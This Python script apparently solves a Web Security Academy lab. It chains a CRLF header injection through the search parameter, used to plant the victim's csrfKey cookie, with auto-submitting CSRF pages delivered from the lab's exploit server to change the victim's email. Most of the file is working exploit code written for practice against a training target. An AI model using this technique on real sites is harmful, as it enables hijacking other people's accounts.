from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request


def solve_lab(session):
    session.login("wiener", "peter")
    csrf_key = session.cookies.get("csrfKey")
    csrf_token = session.get_csrf_token("/my-account?id=wiener")

    # Explanation: When using the search functionality, the search term is reflected
    # in the Set-Cookie response header. However, this function doesn't sanitize the
    # search term, allowing me to set arbitrary response headers. I exploit this
    # vulnerability by setting the csrfKey cookie.

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    data = {"search": f";\r\nSet-Cookie: csrfKey={csrf_key}"}
    req = Request("GET", session.url, data=data)
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com", "csrf": csrf_token},
    )
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
